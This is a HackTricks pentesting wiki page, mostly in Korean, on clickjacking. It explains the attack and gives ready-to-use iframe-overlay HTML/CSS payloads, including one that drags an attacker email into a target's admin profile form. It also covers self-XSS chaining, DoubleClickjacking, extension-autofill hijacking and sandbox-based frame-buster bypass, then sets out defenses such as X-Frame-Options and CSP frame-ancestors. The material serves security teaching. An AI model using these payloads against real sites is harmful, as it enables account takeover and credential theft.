# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Clickjacking이란

In a clickjacking attack, a **사용자**는 웹페이지의 **요소**를 **보이지 않게** 하거나 다른 요소로 위장하여 **클릭하도록** **속게 됩니다**. 이러한 조작은 사용자에게 원치 않는 결과를 초래할 수 있으며, 예를 들어 malware 다운로드, 악성 웹페이지로의 리다이렉션, 자격증명이나 민감한 정보 제공, 금전 이체, 또는 온라인 상품 구매 등이 있습니다.

### Prepopulate forms trick

때때로 **페이지 로딩 시 GET 파라미터를 사용하여 폼 필드의 값을 채우는 것**이 가능합니다. 공격자는 이 동작을 악용해 임의의 데이터로 폼을 채우고 clickjacking payload를 전송하여 사용자가 Submit 버튼을 누르게 만들 수 있습니다.

### Drag\&Drop으로 폼 채우기

사용자에게 **폼을 채우도록** 해야 하는데, 이메일이나 (공격자가 알고 있는) 특정 비밀번호처럼 특정 정보를 직접 입력해 달라고 요청하고 싶지 않다면, 사용자가 **Drag\&Drop** 하도록 요청하여 제어된 데이터가 입력되게 할 수 있습니다. 예시는 [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/)를 참고하세요.

### 기본 Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### 다단계 Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

사용자가 어떤 요소를 클릭해야 **트리거되는 XSS 공격**을 확인했고 해당 페이지가 **clickjacking에 취약**하다면, 버튼/링크를 클릭하도록 사용자를 속이는 데 이를 악용할 수 있습니다.\
예시:\
계정의 일부 비공개 정보(**오직 본인만 설정하고 읽을 수 있는** 세부 정보)에서 **self XSS**를 발견했다고 가정합니다. 이 정보를 설정하는 **form** 페이지가 **Clickjacking**에 취약하며, GET 파라미터로 **form**을 **prepopulate**할 수 있습니다.\
공격자는 해당 페이지에 **Clickjacking** 공격을 준비해 **form**을 **XSS payload**로 **prepopulating**하고, 사용자를 속여 **form**을 **Submit**하도록 만들 수 있습니다. 따라서 **form이 제출될 때** 값들이 변경되면, **사용자가 XSS를 실행**하게 됩니다.


### DoubleClickjacking

우선 [이 포스트](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html)에서 처음 설명된 바와 같이, 이 기법은 피해자에게 특정 위치에 배치된 커스텀 페이지의 버튼을 더블클릭하도록 유도한 다음, mousedown과 onclick 이벤트 간의 타이밍 차이를 이용해 더블클릭 중에 피해자 페이지를 로드하여 **피해자가 실제로 피해자 페이지의 정상 버튼을 클릭하게** 합니다.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> 이 기법은 사용자를 피해자 페이지의 한 위치를 클릭하도록 속여 clickjacking에 대한 모든 보호를 우회할 수 있게 합니다. 따라서 공격자는 **OAuth 권한 수락 같은 단 한 번의 클릭으로 수행 가능한 민감한 동작**을 찾아야 합니다.

### Browser extensions: DOM-based autofill clickjacking

피해자 페이지를 iframe으로 불러오는 것 외에도, 공격자는 페이지에 주입된 browser extension의 UI 요소를 노릴 수 있습니다. Password managers는 포커스된 입력 근처에 autofill 드롭다운을 렌더링합니다; 공격자가 제어하는 필드에 포커스를 주고 extension의 드롭다운을 숨기거나 가리기(opacity/overlay/top-layer tricks)하면, 강제된 사용자 클릭으로 저장된 항목을 선택해 민감한 데이터를 공격자가 제어하는 입력으로 채우게 할 수 있습니다. 이 변형은 iframe 노출이 필요 없으며 전적으로 DOM/CSS 조작으로 동작합니다.

- 구체적인 기법과 PoCs는 다음을 참조하세요:
-
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategies to Mitigate Clickjacking

### Client-Side Defenses

클라이언트 측에서 실행되는 스크립트는 Clickjacking을 방지하기 위해 다음과 같은 동작을 수행할 수 있습니다:

- 애플리케이션 창이 메인 또는 최상위 창인지 확인.
- 모든 프레임을 표시.
- 보이지 않는 프레임에서의 클릭 방지.
- 잠재적인 Clickjacking 시도를 탐지하고 사용자에게 경고.

하지만 이러한 frame-busting scripts는 우회될 수 있습니다:

- **Browsers' Security Settings:** 일부 브라우저는 보안 설정이나 JavaScript 미지원으로 인해 이러한 스크립트를 차단할 수 있습니다.
- **HTML5 iframe sandbox Attribute:** 공격자는 sandbox 속성에 allow-forms 또는 allow-scripts 값을 주고 allow-top-navigation을 제외함으로써 frame buster 스크립트를 무력화할 수 있습니다. 이렇게 하면 iframe이 자신이 최상위 창인지 확인하지 못하게 됩니다. 예:
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
The allow-forms and allow-scripts values enable actions within the <iframe> while disabling top-level navigation. To ensure the intended functionality of the targeted site, additional permissions like allow-same-origin and allow-modals might be necessary, depending on the attack type. Browser console messages can guide which permissions to allow.

### 서버 측 방어

#### X-Frame-Options

The **X-Frame-Options HTTP response header**는 브라우저에 페이지를 <frame> 또는 <iframe>으로 렌더링하는 것이 정당한지 알려 주어 Clickjacking을 방지하는 데 도움을 줍니다:

- X-Frame-Options: deny - 어떤 도메인도 콘텐츠를 프레임으로 표시할 수 없습니다.
- X-Frame-Options: sameorigin - 현재 사이트만 콘텐츠를 프레임으로 표시할 수 있습니다.
- X-Frame-Options: allow-from https://trusted.com - 지정된 'uri'만 페이지를 프레임할 수 있습니다.
- 제한 사항에 유의: 브라우저가 이 지시자를 지원하지 않으면 동작하지 않을 수 있습니다. 일부 브라우저는 CSP frame-ancestors 지시어를 선호합니다.

#### Content Security Policy (CSP) frame-ancestors directive

**frame-ancestors directive in CSP**는 Clickjacking 방지를 위한 권장 방법입니다:

- frame-ancestors 'none' - X-Frame-Options: deny와 유사합니다.
- frame-ancestors 'self' - X-Frame-Options: sameorigin와 유사합니다.
- frame-ancestors trusted.com - X-Frame-Options: allow-from와 유사합니다.

예를 들어, 다음 CSP는 같은 도메인에서만 프레이밍을 허용합니다:

Content-Security-Policy: frame-ancestors 'self';

추가 세부사항과 복잡한 예제는 [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) 및 [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)에서 확인할 수 있습니다.

### Content Security Policy (CSP)와 child-src 및 frame-src

**Content Security Policy (CSP)**는 브라우저가 어떤 소스에서 콘텐츠를 로드하도록 허용할지 지정하여 Clickjacking 및 기타 코드 주입 공격을 방지하는 데 도움이 되는 보안 대책입니다.

#### frame-src 지시어

- 프레임에 대한 유효한 소스를 정의합니다.
- default-src 지시어보다 더 구체적입니다.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
이 정책은 동일 출처(self) 및 https://trusted-website.com의 프레임을 허용합니다.

#### child-src 디렉티브

- CSP level 2에서 web workers와 frames에 대한 유효한 소스를 설정하기 위해 도입되었습니다.
- frame-src 및 worker-src의 대체(fallback) 역할을 합니다.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
이 정책은 동일 출처(self) 및 https://trusted-website.com의 frames와 workers를 허용합니다.

**사용 시 참고:**

- 사용 중단: child-src는 frame-src 및 worker-src로 대체되는 방향으로 점진적으로 사용 중단되고 있습니다.
- 대체 동작: frame-src가 없으면 child-src가 프레임의 대체로 사용됩니다. 둘 다 없으면 default-src가 사용됩니다.
- 엄격한 출처 정의: 디렉티브(directives)에 신뢰할 수 있는 출처만 포함시켜 악용을 방지하세요.

#### JavaScript 프레임 차단 스크립트

완벽하지는 않지만, JavaScript 기반의 프레임 차단 스크립트는 웹 페이지가 프레임에 포함되는 것을 방지하는 데 사용될 수 있습니다. 예시:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Anti-CSRF Tokens 사용

- **토큰 검증:** 웹 애플리케이션에서 anti-CSRF tokens를 사용하여 상태 변경 요청(state-changing requests)이 사용자의 의도에 의해 이루어졌는지 확인하고 Clickjacked 페이지를 통한 요청이 되지 않도록 하세요.

## 참고자료

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../banners/hacktricks-training.md}}
